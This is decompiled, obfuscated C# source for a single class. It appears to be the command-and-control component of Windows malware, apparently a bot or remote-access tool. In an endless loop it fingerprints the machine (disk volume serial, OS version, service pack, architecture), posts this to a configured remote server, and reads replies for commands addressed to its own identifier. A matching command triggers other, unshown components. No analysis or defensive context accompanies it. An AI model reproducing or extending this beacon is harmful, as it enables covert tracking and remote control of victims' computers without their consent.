using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

internal sealed class Class1
{
	private Class12 class12_0;

	private Class9 class9_0;

	public Class1(Class12 class12_1, Class9 class9_1)
	{
		class12_0 = class12_1;
		class9_0 = class9_1;
	}

	public void method_0()
	{
		while (true)
		{
			string text = method_1();
			string[] array = text.Split(new char[1] { '\n' });
			string[] array2 = array;
			foreach (string input in array2)
			{
				Match match = Regex.Match(input, "\\(([A-Za-z0-9]*),([A-Za-z0-9]*)\\)", RegexOptions.Singleline);
				if (match.Groups.Count > 1 && match.Groups[1].Value == Class6.string_1)
				{
					class12_0.method_0();
					class9_0.method_1();
					Class12.smethod_0();
				}
			}
			Thread.Sleep(Class6.int_0);
		}
	}

	private string method_1()
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(Class6.string_2);
			webRequest.Method = "POST";
			string text = "hardware_id=" + Uri.EscapeDataString(smethod_0()) + "&user_id=" + Uri.EscapeDataString(Class6.string_0) + "&os_ver=" + Uri.EscapeDataString(method_3()) + "&os_sp=" + Uri.EscapeDataString(method_4()) + "&os_arch=" + Uri.EscapeDataString(method_2().ToString());
			webRequest.ContentType = "application/x-www-form-urlencoded";
			webRequest.ContentLength = text.Length;
			StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream());
			streamWriter.Write(text);
			streamWriter.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			string result = streamReader.ReadToEnd();
			httpWebResponse.Close();
			streamReader.Close();
			return result;
		}
		catch
		{
			return string.Empty;
		}
	}

	public static string smethod_0()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"c:\"");
		val.Get();
		return ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
	}

	private int method_2()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
		if (!string.IsNullOrEmpty(environmentVariable) && string.Compare(environmentVariable, 0, "x86", 0, 3, ignoreCase: true) != 0)
		{
			return 64;
		}
		return 32;
	}

	private string method_3()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string result = string.Empty;
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				result = "Me";
				break;
			case 10:
				result = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				result = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				result = "NT 3.51";
				break;
			case 4:
				result = "NT 4.0";
				break;
			case 5:
				result = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				result = ((version.Minor != 0) ? "7" : "Vista");
				break;
			}
		}
		return result;
	}

	private string method_4()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		return oSVersion.ServicePack;
	}
}
